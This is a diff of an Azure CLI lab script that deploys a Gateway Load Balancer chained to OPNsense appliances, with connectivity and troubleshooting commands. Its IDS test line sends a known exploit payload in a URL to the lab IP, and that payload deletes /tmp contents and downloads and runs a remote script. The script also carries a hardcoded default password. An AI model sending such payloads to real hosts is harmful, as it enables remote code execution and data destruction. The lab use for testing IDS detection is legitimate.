@@ -82,7 +82,7 @@ az network bastion create --name consumer-bastion --sku basic  --public-ip-addre
 
 ### Provider ###
 #Variables
-provider_rg=gwlb-lab2
+provider_rg=gwlb-lab4
 provider_location=centralus
 providervnetcidr="10.0.0.0/24"
 providerexternalcidr="10.0.0.0/27"
@@ -92,7 +92,7 @@ nva=provider-nva
 mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
 
 # 1) Create provider VNET and Internal/External 
-az group create --name $provider_rg --provider_location $provider_location --output none
+az group create --name $provider_rg --location $provider_location --output none
 az network vnet create --resource-group $provider_rg --name provider-vnet --location $provider_location --address-prefixes $providervnetcidr --subnet-name external --subnet-prefix $providerexternalcidr --output none
 az network vnet subnet create --name internal --resource-group $provider_rg --vnet-name provider-vnet --address-prefix $providerinternalcidr --output none
 
@@ -103,9 +103,9 @@ az network lb probe create -g $provider_rg --lb-name provider-nva-glb --name ssh
 az network lb rule create -g $provider_rg --lb-name provider-nva-glb --name haportrule --protocol all --frontend-ip-name frontendip1 --backend-pool-name nvabackend --probe-name sshprobe --frontend-port 0 --backend-port 0 
 
 # 3) Deploy both OPNsense NVA (work on this)
-az deployment group create --name nva$-deploy-$RANDOM --resource-group $provider_rg \
+az deployment group create --name $nva-deploy-$RANDOM --resource-group $provider_rg \
 --template-uri "https://raw.githubusercontent.com/dmauser/azure-gateway-lb/main/bicep/main-active-active.json" \
---parameters virtualMachineSize=Standard_B2s virtualMachineName=nva$ TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
+--parameters virtualMachineSize=Standard_B2s virtualMachineName=$nva TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
 --no-wait
 
 # 7) Deploy Bastion
@@ -113,66 +113,29 @@ az network vnet subnet create --resource-group $provider_rg --name AzureBastionS
 az network public-ip create --resource-group $provider_rg --name provider-bastion-pip --sku Standard --location $provider_location --output none
 az network bastion create --name provider-bastion --sku basic  --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location
 
-# ***OPNSense UI*** 
-# -> Interfaces -> Other 
-#- vxlan0 (Ext) - VNI 801 / Source address 10.0.0.37 / Remote Address: 10.0.0.36
-#- vxlan1 (Int) - VNI 800 / Source address 10.0.0.37 / Remote Address: 10.0.0.36
-# Note ifconfig dump: vxlan vni 800 local 10.0.0.37:4789 remote 10.0.0.36:4789
-# -> Interfaces Assignments
-# vxlan0 - glbext
-# vxlan1 - glbint
-# Go to each interface glbext/glbint and enable interface
-# Bridge vxlan interfaces
-# -> Interfaces Assignments
-# bridge0 - glbbridge
-# Go to each interface glbext/glbint and enable interface
-# Adjust LAN rule to source any to allow access from Jumpbox
-
-# Manual config OPNSense using Jumpbox
-# Add Linux Jumpbox on Provider-VNET - add vmsubnet + UbuntuVM
-
-# On OPNSense Shell:
-
-#OPN Startup script to VXLAN survive reboots
-cat > /usr/local/etc/rc.syshook.d/start/25-azure <<EOL
-#!/bin/sh
-ifconfig vxlan0 down
-ifconfig vxlan0 vxlanlocal 10.0.0.37 vxlanlocalport 10801 vxlanremote 10.0.0.36 vxlanremoteport 10801
-ifconfig vxlan0 up
-ifconfig vxlan1 down
-ifconfig vxlan1 vxlanlocal 10.0.0.37 vxlanlocalport 10800 vxlanremote 10.0.0.36 vxlanremoteport 10800
-ifconfig vxlan1 up
-ifconfig bridge0 addm vxlan0
-ifconfig bridge0 addm vxlan1
-ifconfig bridge0 up
-EOL
-chmod +x /usr/local/etc/rc.syshook.d/start/25-azure
-
-# Demo (make changes based on your needs)
-# Attach LB to GW (different sub)
+# Attach LB to GW (different subscriptions - Portal only works for the same subscription)
 # Check current sub
 az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
-# MSDN Sub
-az account set --subscription MSDN_Dmauser  #MSDN
+# Subscription where Consumer is.
+az account set --subscription MSDN_Dmauser  #MSDN ---> Change to your subscription name
 feid=$(az network lb frontend-ip show -g $provider_rg --lb-name provider-nva-glb --name FW --query id --output tsv)
 echo $feid
 
-# MS Sub
+# Sub where Provider is:
 # Add GLB chain
-az account set --subscription DMAUSER-MS #Microsoft
-az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $feid -output none
+az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
+az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $feid --output none
 
 # Validate GLB chain
-az account set --subscription DMAUSER-MS #Microsoft
+az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
 az network lb frontend-ip show -g $consumer_rg --name frontendip1 --lb-name consumer-elb --query gatewayLoadBalancer.id -o tsv
 
 #Remove GLB chain
-az account set --subscription DMAUSER-MS #Microsoft
+az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
 az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb ""
 
-#Provider Jumpbox
-ssh dmauser@168.61.178.81
 
+#### Troubleshooting/Advanced validations
 #Check traffic VxLAN traffic OPNSense after chaining with LB
 tcpdump -n -i hn1 host 10.0.0.36
 
@@ -182,16 +145,25 @@ tcpdump -n -i vxlan0
 #Outbound (External Interface)
 tcpdump -n -i vxlan1 
 
-# Vulnerability Test (Enable IDS)
+# Vulnerability Test (Enable IDS on OPNsense)
 curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws
 
 # Connectivity Checks / Replace the Public IP listed below with your LB.
 # Get you LB Public IP:
 az account set --subscription DMAUSER-MS #Microsoft
-az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv
+consumerelbpip=$(az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv)
 
-# Port 50000 - NAT Rule to 22 Consumer-VM Backend
-psping -t 40.77.94.253:50000
+
+## Port 50000 - NAT Rule to 22 Consumer-VM Backend
+
+# Use the output below to run your connectivity tests. 
+#Tests on Windows 
+echo psping -t $consumerelbpip 
+echo psping -t $consumerelbpip:50000
+echo psping -t $consumerelbpip:50000
+
+
+# Use Linux (requires install packages)
 sudo hping3 40.77.94.253 -S -p 50000
 sudo nping --tcp 40.77.94.253 -p 80 -c 50000
 
